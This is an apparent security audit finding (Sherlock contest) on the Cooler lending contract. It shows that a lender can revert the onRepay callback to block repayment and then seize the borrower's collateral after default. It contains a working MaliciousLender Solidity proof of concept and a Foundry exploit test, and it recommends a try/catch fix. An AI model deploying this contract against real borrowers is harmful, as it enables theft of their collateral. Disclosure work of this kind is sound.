@@ -1,0 +1,134 @@
+# [H] Lender can block repayment by reverting on `onRepay()` callback
+
+## Summary
+Severity: High
+Reporter: Shaggy Teal Blackbird
+Source: https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/Cooler.sol#L184
+Type: audit-issue
+
+## Details
+# Lender can block repayment by reverting on `onRepay()` callback
+## Summary
+The procotols implements a way to callback the lender at each important function call. There is such a callback in the `repayLoan()` function which allows the borrower to repay the loan.
+If the lender implements the callbacks functionnality but reverts on `onRepay()` callback, this prevents the borrower from repaying the loan. The lender can then wait until the loan expires to claim the defaulted loan's collateral.
+
+## Vulnerability Detail
+In the `repayLoan()` function, this external call is made to the lender:
+```solidity
+File: Cooler.sol
+
+L184: // If necessary, trigger lender callback.
+        if (loan.callback) CoolerCallback(loan.lender).onRepay(loanID_, repaid_); // @audit lender can revert this call
+        return decollateralized;
+```
+https://github.com/ohmzeus/Cooler/blob/c6f2bbe1b51cdf3bb4d078875170177a1b8ba2a3/src/Cooler.sol#L184
+
+If the `onRepay()` function of the lender reverts, this permanently blocks the borrower from repaying his debt.
+The lender can then wait until the loan defaults to "steal" the collateral.
+
+## Impact
+### Proof of Concept
+Here is a malicious contract that can perform this attack:
+```solidity
+// SPDX-License-Identifier: AGPL-3.0
+pragma solidity ^0.8.0;
+
+import {CoolerCallback} from "src/CoolerCallback.sol";
+import {Cooler} from "src/Cooler.sol";
+import {ERC20} from "solmate/tokens/ERC20.sol";
+
+contract MaliciousLender is CoolerCallback {
+    address owner;
+    constructor(address coolerFactory_) CoolerCallback(coolerFactory_) {
+        owner = msg.sender;
+    }
+    
+    // Revert on repay. This block borrower from repaying the loan
+    function _onRepay(uint256, uint256) internal override {
+        revert("Hahah you cannot repay");
+    }
+
+    function clearRequest(address cooler, uint256 reqID_) external returns (uint256 loanID){
+        require(msg.sender == owner, "Only owner");
+        ERC20 debt = Cooler(cooler).debt();
+        uint256 amount = Cooler(cooler).getRequest(reqID_).amount;
+        debt.transferFrom(msg.sender, address(this), amount);
+        debt.approve(cooler, amount);
+        loanID = Cooler(cooler).clearRequest(reqID_, true, true);
+    }
+
+    function claimDefaulted(address cooler, uint256 loanID_) external {
+        Cooler(cooler).claimDefaulted(loanID_);
+        withdraw(address(Cooler(cooler).collateral()));
+    }
+
+    function withdraw(address token) public {
+        require(msg.sender == owner, "Only owner");
+        ERC20(token).transfer(msg.sender, ERC20(token).balanceOf(address(this)));
+    }
+
+    function _onRoll(uint256, uint256, uint256) internal override {/* Do nothing */}
+    function _onDefault(uint256, uint256, uint256) internal override {/* Do nothing */}
+}
+```
+You can add this test to `Cooler.t.sol` to showcase the attack process.
+```solidity
+function test_EXPLOIT_Lender_blocks_repaiment() public {
+    // test inputs
+    uint256 reqAmount_ = 1000e18;
+    uint256 repayAmount_ = reqAmount_/2;
+    // test setup
+    cooler = _initCooler();
+    (uint256 reqID, ) = _requestLoan(reqAmount_);
+    uint256 initCoolerCollat = collateral.balanceOf(address(cooler));
+    assertEq(collateral.balanceOf(address(lender)), 0); // Lender starts with 0 collateral tokens
+    console2.log("collateral: cooler balance = ",collateral.balanceOf(address(cooler)));
+    console2.log("collateral: lender balance = ",collateral.balanceOf(address(lender)));
+
+    // Lender creates MaliciousLender contract and clear the loan request
+    vm.startPrank(lender);
+    MaliciousLender maliciousLender = new MaliciousLender(address(coolerFactory));
+    debt.approve(address(maliciousLender), reqAmount_);
+    uint256 loanID = maliciousLender.clearRequest(address(cooler), reqID);
+    vm.stopPrank();
+
+    // block.timestamp < loan expiry
+    vm.warp(block.timestamp + 15 days);
+    console2.log("15 days passed...");
+
+    vm.startPrank(owner);
+    // Aprove debt so that it can be transferred by cooler
+    debt.approve(address(cooler), repayAmount_);
+    // Owner can't repay the loan because transactionis reverted by maliciousLender
+    vm.expectRevert("Hahah you cannot repay");
+    cooler.repayLoan(loanID, repayAmount_);
+    vm.stopPrank();
+    console2.log("[-] Owner was not able to repay his loan");
+
+    // block.timestamp > loan expiry
+    vm.warp(block.timestamp + DURATION + 1);
+    console2.log("Few days passed, loan is now exipred...");
+
+    // Lender claims the defaulted loan
+    vm.startPrank(lender);
+    debt.approve(address(maliciousLender), reqAmount_);
+    maliciousLender.claimDefaulted(address(cooler), loanID);
+    vm.stopPrank();
+    console2.log("[+] Lender claimed faulted loan");
+
+    assertEq(collateral.balanceOf(address(lender)), initCoolerCollat); // Lender got all the collateral tokens
+    assertEq(collateral.balanceOf(address(cooler)), 0); // Lender got all the collateral tokens
+    console2.log("collateral: cooler balance = ",collateral.balanceOf(address(cooler)));
+    console2.log("collateral: lender balance = ",collateral.balanceOf(address(lender)));
+}
+```
+
+## Code Snippet
+https://github.com/sherlock-audit/2023-08-cooler/blob/main/Cooler/src/Cooler.sol#L185
+
+## Tool used
+
+Manual Review + Foundry
+
+## Recommendation
+One way to prevent this issue is by adding a try/catch statement around the callback statements (apply this to `onRoll()` too).
